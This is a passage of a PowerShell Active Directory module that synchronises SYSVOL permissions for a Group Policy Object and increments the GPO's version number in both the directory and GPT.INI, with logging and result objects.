                if (Test-Path $subPath) {
                    try {
                        $subAcl = Get-Acl -Path $subPath
                        # Enable inheritance ($false = do NOT protect from parent, $false = do NOT preserve existing)
                        $subAcl.SetAccessRuleProtection($false, $false)
                        Set-Acl -Path $subPath -AclObject $subAcl -ErrorAction SilentlyContinue
                        Write-Log "[Sync-GPOSYSVOLPermissions] Enabled inheritance on: $subPath"
                    } catch {
                        Write-Log "[Sync-GPOSYSVOLPermissions] Warning: Could not enable inheritance on $subPath : $_"
                    }
                }
            }

            return @{
                Success = $true
                SYSVOLPath = $gpoBasePath
                ACECount = $SYSVOLACEData.Count
            }
        }.GetNewClosure()

        if ($smbResult -and $smbResult.Success) {
            return [PSCustomObject]@{
                Operation = "SyncSYSVOL"
                GPO = $GPOName
                GPOGUID = $GPOGUID
                SYSVOLPath = $smbResult.SYSVOLPath
                ACECount = $smbResult.ACECount
                Success = $true
                Message = "SYSVOL permissions synchronized successfully"
            }
        } else {
            return [PSCustomObject]@{
                Operation = "SyncSYSVOL"
                GPO = $GPOName
                Success = $false
                Message = "SYSVOL sync returned no result"
            }
        }

    } catch {
        Write-Log "[Sync-GPOSYSVOLPermissions] Error: $_"
        return [PSCustomObject]@{
            Operation = "SyncSYSVOL"
            GPO = $GPOName
            Success = $false
            Message = $_.Exception.Message
        }
    }
}

# Internal helper function to increment GPO version
function Update-GPOVersion {
    <#
    .SYNOPSIS
        Internal helper to increment GPO version in AD and SYSVOL.
    .DESCRIPTION
        GPO version is stored in two places:
        1. AD object: versionNumber attribute (combined User/Machine version)
        2. SYSVOL: GPT.INI file (Version= line)

        Version format:
        - versionNumber = (UserVersion * 65536) + MachineVersion
        - Machine changes: Increment MachineVersion by 1
        - User changes: Increment UserVersion by 1

        Clients poll for version changes to know when to re-apply GPO.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$GPODN,

        [Parameter(Mandatory=$true)]
        [string]$GPOName,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [switch]$IncrementMachine,

        [Parameter(Mandatory=$false)]
        [switch]$IncrementUser
    )

    try {
        Write-Log "[Update-GPOVersion] Incrementing GPO version for: $GPOName"

        # Default to Machine if neither specified
        if (-not $IncrementMachine -and -not $IncrementUser) {
            $IncrementMachine = $true
        }

        # Extract GUID from GPO DN
        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
        if (-not $GPOGUID) {
            return [PSCustomObject]@{
                Operation = "UpdateGPOVersion"
                GPO = $GPOName
                Success = $false
                Message = "Could not extract GUID from GPO DN: $GPODN"
            }
        }

        # Step 1: Read current version from AD via Invoke-LDAPSearch
        $gpoResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('versionNumber') -SizeLimit 1)[0]
        $currentVersion = if ($gpoResult -and $gpoResult.versionNumber) { [int]$gpoResult.versionNumber } else { 0 }

        Write-Log "[Update-GPOVersion] Current AD version: $currentVersion"

        # Decode version: High word = User version, Low word = Machine version
        $userVersion = [math]::Floor($currentVersion / 65536)
        $machineVersion = $currentVersion -band 0xFFFF

        Write-Log "[Update-GPOVersion] User version: $userVersion, Machine version: $machineVersion"

        # Increment appropriate version
        if ($IncrementMachine) {
            $machineVersion++
            Write-Log "[Update-GPOVersion] Incremented Machine version to: $machineVersion"
        }
        if ($IncrementUser) {
            $userVersion++
            Write-Log "[Update-GPOVersion] Incremented User version to: $userVersion"
        }

        # Calculate new combined version
        $newVersion = ($userVersion * 65536) + $machineVersion
        Write-Log "[Update-GPOVersion] New combined version: $newVersion"

        # Step 2: Update AD versionNumber via ModifyRequest
        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
        $ModifyRequest.DistinguishedName = $GPODN
        $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
        $Modification.Name = "versionNumber"
        $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
        $Modification.Add([string]$newVersion) | Out-Null
        $ModifyRequest.Modifications.Add($Modification) | Out-Null
        $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
        if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
            throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
        }
        Write-Log "[Update-GPOVersion] Updated AD versionNumber to: $newVersion"

        # Step 3: Update SYSVOL GPT.INI
        $domainName = $Script:LDAPContext.Domain
        $gpoGuid = $GPOGUID
        $newVersionVal = $newVersion

        $smbResult = Invoke-SMBAccess -Description "Update GPO version in GPT.INI" -ErrorHandling Continue -ScriptBlock {
            param($basePath)

            $gptIniPath = Join-Path $basePath "$domainName\Policies\$gpoGuid\GPT.INI"

            if (-not (Test-Path $gptIniPath)) {
                Write-Log "[Update-GPOVersion] GPT.INI not found, creating new one"
                $gptIniContent = "[General]`r`nVersion=$newVersionVal"
            } else {
                $gptIniContent = Get-Content -Path $gptIniPath -Raw

                if ($gptIniContent -match 'Version=\d+') {
                    $gptIniContent = $gptIniContent -replace 'Version=\d+', "Version=$newVersionVal"
                } else {
                    # Add Version line if missing
                    if ($gptIniContent -match '\[General\]') {
                        $gptIniContent = $gptIniContent -replace '(\[General\])', "`$1`r`nVersion=$newVersionVal"
                    } else {
                        $gptIniContent = "[General]`r`nVersion=$newVersionVal`r`n$gptIniContent"
                    }
                }
            }

            Set-Content -Path $gptIniPath -Value $gptIniContent -Force -ErrorAction Stop
            Write-Log "[Update-GPOVersion] Updated GPT.INI: $gptIniPath"

            return @{
                Success = $true
                GPTIniPath = $gptIniPath
            }
        }.GetNewClosure()

        $sysvolSuccess = $smbResult -and $smbResult.Success

        return [PSCustomObject]@{
            Operation = "UpdateGPOVersion"
            GPO = $GPOName
            GPOGUID = $GPOGUID
            PreviousVersion = $currentVersion
            NewVersion = $newVersion
            UserVersion = $userVersion
            MachineVersion = $machineVersion
            SYSVOLUpdated = $sysvolSuccess
            Success = $true
            Message = "GPO version updated successfully"
        }

    } catch {
        Write-Log "[Update-GPOVersion] Error: $_"
        return [PSCustomObject]@{
            Operation = "UpdateGPOVersion"
            GPO = $GPOName
            Success = $false
            Message = $_.Exception.Message
        }
    }
}
